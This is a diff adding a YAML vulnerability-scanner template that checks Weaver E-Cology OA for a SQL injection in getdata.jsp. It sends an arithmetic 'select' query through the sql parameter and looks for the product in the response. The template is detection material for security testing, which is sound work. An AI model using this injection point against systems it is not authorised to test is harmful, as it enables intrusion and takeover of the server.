@@ -1,0 +1,22 @@
+id: ecology-getselectallid-sqli
+
+info:
+  name: 泛微OA E-Cology getdata.jsp SQL注入漏洞
+  author: Print1n
+  severity: high
+  verified: true
+  description: |-
+    泛微OA V8 存在SQL注入漏洞，攻击者可以通过漏洞获取管理员权限和服务器权限 app="泛微-协同办公OA"
+  tags: weaver,ecology,sqli
+  created: 2023/06/23
+
+set:
+  r1: randomInt(1000, 9999)
+  r2: randomInt(1000, 9999)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select+{{r1}}*{{r2}}+as+id
+    expression: response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
+expression: r0()
